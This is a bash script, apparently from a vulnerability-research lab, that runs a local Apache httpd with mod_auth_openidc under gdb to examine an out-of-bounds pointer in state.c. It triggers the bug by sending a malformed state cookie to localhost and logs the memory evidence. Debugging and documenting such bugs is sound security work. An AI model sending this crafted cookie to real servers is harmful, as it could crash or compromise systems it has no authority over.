#!/usr/bin/env bash
# Detail the live OOB pointer target: owner bytes, mapping, post-store reads.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/apache2shell/build/httpd-2.4.70-install/bin/httpd
SRC="$HERE/src/mod_auth_openidc-plain/src/state.c"
OUT="$HERE/evidence/plain-oob"
export LD_LIBRARY_PATH="$HERE/plain-prefix/lib"
mkdir -p "$OUT"
"$HTTPD" -f "$HERE/httpd-plain.conf" -k stop >/dev/null 2>&1
rm -f "$HERE/httpd-plain.pid"
sleep 1
timeout 60 gdb -q -batch \
    -ex 'set pagination off' -ex 'set breakpoint pending on' \
    -ex "break $SRC:219" \
    -ex "run -f $HERE/httpd-plain.conf -X" \
    -ex 'printf "STORE=%p PTR=%p\n", cookie, *(void**)cookie' \
    -ex 'x/32cb *(char**)cookie-16' \
    -ex 'x/8gx cookie-32' \
    -ex 'info proc mappings' \
    -ex 'next' \
    -ex 'watch -l *(unsigned long*)cookie' \
    -ex 'continue' \
    -ex 'printf "WATCH STOP PC=%s\n", $pc' \
    -ex 'bt 6' \
    --args "$HTTPD" >"$OUT/detail.txt" 2>&1 &
gp=$!
for i in 1 2 3 4 5 6; do
    code=$(curl -sS --max-time 8 -o /dev/null -w '%{http_code}' \
        -H 'Cookie: mod_auth_openidc_state_novalue' http://127.0.0.1:18090/protected 2>/dev/null || true)
    [ "$code" != "000" ] && break
    sleep 2
done
wait "$gp"
"$HTTPD" -f "$HERE/httpd-plain.conf" -k stop >/dev/null 2>&1
grep -E 'STORE=|0x7ffff5|WATCH STOP|Hardware watchpoint|Old value|New value|^#|exited|SIG' "$OUT/detail.txt" | head -60
